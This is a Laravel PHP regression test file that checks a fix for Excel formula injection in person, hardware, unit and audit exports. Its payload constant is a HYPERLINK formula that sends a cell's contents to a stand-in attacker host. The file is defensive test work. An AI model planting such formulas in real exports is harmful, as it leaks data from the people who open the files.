<?php

namespace Tests\Feature;

use App\Exports\HardwareAuditsExport;
use App\Exports\HardwareExport;
use App\Exports\PersonsExport;
use App\Exports\UnitsExport;
use App\Models\Hardware;
use App\Models\HardwareAudit;
use App\Models\Person;
use App\Models\Unit;
use App\Support\ExcelCell;
use Database\Seeders\PermissionSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Session;
use Maatwebsite\Excel\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Tests\Support\Concerns\InteractsWithTestSetup;
use Tests\TestCase;

covers(ExcelCell::class);

/**
 * Regression tests for issue #886 (Excel formula injection, CWE-1236).
 *
 * A stored value starting with '=' binds as TYPE_FORMULA in the served
 * sheet. The fix prefixes it with a single quote at map() time so the
 * cell stays TYPE_STRING — in xlsx AND in the audits csv route (?format=csv
 * carries no cell-type metadata, so only map() can fix it).
 */
class ExcelFormulaEscapeTest extends TestCase
{
    use InteractsWithTestSetup;
    use RefreshDatabase;

    private const PAYLOAD = '=HYPERLINK("https://attacker.test/?d="&A1,"open")';

    protected function setUp(): void
    {
        parent::setUp();
        Session::flush();
        $this->seed(PermissionSeeder::class);
        $this->seedLookupTables();
    }

    public function test_escape_prefixes_leading_equals_and_passes_rest_through(): void
    {
        $this->assertSame("'".self::PAYLOAD, ExcelCell::escape(self::PAYLOAD));
        $this->assertSame('-1+2', ExcelCell::escape('-1+2'));
        $this->assertSame('@mention', ExcelCell::escape('@mention'));
        $this->assertSame('', ExcelCell::escape(''));
        $this->assertSame(2, ExcelCell::escape(2));
        $this->assertNull(ExcelCell::escape(null));
    }

    public function test_persons_export_escapes_formula_payload(): void
    {
        ['user' => $user, 'unit' => $unit] = $this->createUserWithUnit(['kargozini']);

        $person = Person::factory()->create([
            'f_name' => self::PAYLOAD,
            'l_name' => 'عسگری',
            'u_id' => $unit->id,
        ]);

        $export = new PersonsExport(collect([$person->fresh('semat', 'tahsil', 'estekhdam', 'radif', 'unit')]));
        $row = $export->map($export->collection()->first());

        $this->assertContains("'".self::PAYLOAD, $row);

        // The escaped value must bind as string, not formula.
        $binder = new DefaultValueBinder;
        $this->assertSame(
            DataType::TYPE_STRING,
            $binder->dataTypeForValue("'".self::PAYLOAD)
        );
        $this->assertSame(
            DataType::TYPE_FORMULA,
            $binder->dataTypeForValue(self::PAYLOAD),
            'Precondition: the raw payload really binds as a formula on this stack.'
        );

        $this->actingAs($user);
    }

    public function test_hardware_export_escapes_formula_payload(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);
        $this->actingAs($user);

        $hardware = Hardware::factory()->create([
            'n_code' => $user->n_code,
            'pc_name' => self::PAYLOAD,
            'comments' => self::PAYLOAD,
        ]);

        $export = new HardwareExport(Hardware::where('id', $hardware->id), ['pc_name', 'comments']);
        $row = $export->map($export->collection()->first());

        $this->assertSame(["'".self::PAYLOAD, "'".self::PAYLOAD], array_values($row));
    }

    public function test_units_export_escapes_formula_payload(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['organization']);
        $this->actingAs($user);

        $unit = Unit::factory()->create(['name' => self::PAYLOAD]);

        $export = new UnitsExport(
            collect([$unit]),
            [$unit->id => ['path' => self::PAYLOAD, 'depth' => 0, 'parent_name' => self::PAYLOAD]]
        );
        $row = $export->map($export->collection()->first());

        $this->assertContains("'".self::PAYLOAD, $row);
        $this->assertNotContains(self::PAYLOAD, $row);
    }

    public function test_audits_export_escapes_user_agent_payload_in_map(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);
        $this->actingAs($user);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);

        $audit = HardwareAudit::create([
            'hardware_id' => $hardware->id,
            'user_id' => $user->id,
            'action' => 'updated',
            'changes' => [['field' => 'cpu', 'old' => 'a', 'new' => self::PAYLOAD]],
            'source' => 'web',
            'ip_address' => '127.0.0.1',
            'user_agent' => self::PAYLOAD,
        ]);

        $export = new HardwareAuditsExport(HardwareAudit::where('id', $audit->id));
        $row = $export->map($export->collection()->first());

        $this->assertContains("'".self::PAYLOAD, $row);
        $this->assertNotContains(self::PAYLOAD, $row);
    }

    public function test_observer_sanitises_user_agent_and_changes_at_source(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);
        $this->actingAs($user);
        // request() in tests is the already-bound instance; set the UA on it
        // directly so the observer persists the payload verbatim pre-fix.
        request()->headers->set('User-Agent', self::PAYLOAD);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);
        $hardware->update(['cpu' => self::PAYLOAD]);

        $audit = HardwareAudit::where('hardware_id', $hardware->id)
            ->where('action', 'updated')
            ->latest('id')
            ->first();

        $this->assertNotNull($audit);
        $this->assertSame("'".self::PAYLOAD, $audit->user_agent);

        $found = false;
        foreach ($audit->changes ?? [] as $entry) {
            foreach ((array) $entry as $value) {
                if ($value === self::PAYLOAD) {
                    $this->fail('Raw formula payload persisted in changes.');
                }
                if ($value === "'".self::PAYLOAD) {
                    $found = true;
                }
            }
        }
        $this->assertTrue($found, 'Expected the escaped payload in stored changes.');
    }

    public function test_audits_export_route_escapes_payload_in_xlsx_and_csv(): void
    {
        ['user' => $user] = $this->createUserWithUnit(['manage_hardware']);

        $hardware = Hardware::factory()->create(['n_code' => $user->n_code]);

        HardwareAudit::create([
            'hardware_id' => $hardware->id,
            'user_id' => $user->id,
            'action' => 'updated',
            'changes' => [['field' => 'cpu', 'old' => 'a', 'new' => self::PAYLOAD]],
            'source' => 'web',
            'ip_address' => '127.0.0.1',
            'user_agent' => self::PAYLOAD,
        ]);

        $token = $user->createToken('test-token', ['hardware:read'])->plainTextToken;
        $headers = ['Authorization' => 'Bearer '.$token, 'Accept' => 'application/json'];

        // `Hardware::factory()` fires HardwareAuditObserver::created, so this
        // hardware has TWO audit rows: the observer's (user_agent = the test
        // client UA) and the payload row above. Both land in the same second —
        // `hardware_audits.created_at` is `timestamp(0)` — and the export sorts
        // by `latest('created_at')`, so their relative order is undefined. A
        // hardcoded cell address therefore reads whichever row Postgres
        // happened to place first, which is what made this test flake. Locate
        // the payload row by its own content instead, so the assertion is
        // about the escaping and not about row order.
        $userAgentColumn = array_search('کاربر آژنت', (new HardwareAuditsExport(HardwareAudit::query()))->headings(), true);

        $this->assertNotFalse($userAgentColumn, 'headings() lost the user_agent column');

        // xlsx: the stored user_agent cell must bind as string, not formula.
        $xlsx = $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export");
        $xlsx->assertStatus(200);
        $tmp = tempnam(sys_get_temp_dir(), 'audit-xlsx').'.xlsx';
        file_put_contents($tmp, $xlsx->streamedContent());
        $spreadsheet = IOFactory::load($tmp);
        $sheet = $spreadsheet->getActiveSheet();

        // Scan the user_agent column only — column A is the audit id, so a
        // whole-row scan would match on the wrong thing.
        $letter = Coordinate::stringFromColumnIndex($userAgentColumn + 1);
        $userAgents = [];
        for ($r = 2; $r <= $sheet->getHighestDataRow(); $r++) {
            $value = $sheet->getCell($letter.$r)->getValue();
            $userAgents[$r] = $value === null ? '' : (string) $value;
        }

        $this->assertTrue(
            in_array("'".self::PAYLOAD, $userAgents, true),
            'The exported sheet has no row carrying the escaped user_agent; got: '
                .json_encode($userAgents)
        );

        // Assert on the cell that actually carries the payload, whatever row
        // the tie-breaking left it in.
        $row = array_search("'".self::PAYLOAD, $userAgents, true);
        $cell = $sheet->getCell($letter.$row);
        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
        $this->assertSame("'".self::PAYLOAD, $cell->getValue());
        $spreadsheet->disconnectWorksheets();
        unlink($tmp);

        // csv: no cell-type metadata exists, so the raw payload must be gone.
        // (The writer CSV-quotes the field and doubles inner quotes, so
        // assert on the quote-normalised fragments, not the raw payload.)
        $csv = $this->withHeaders($headers)
            ->getJson("/api/hardware/{$hardware->id}/audits/export?format=csv");
        $csv->assertStatus(200);
        $body = $csv->streamedContent();
        $this->assertStringContainsString("'=HYPERLINK", $body);
        $this->assertStringNotContainsString(',=HYPERLINK', $body);
    }
}
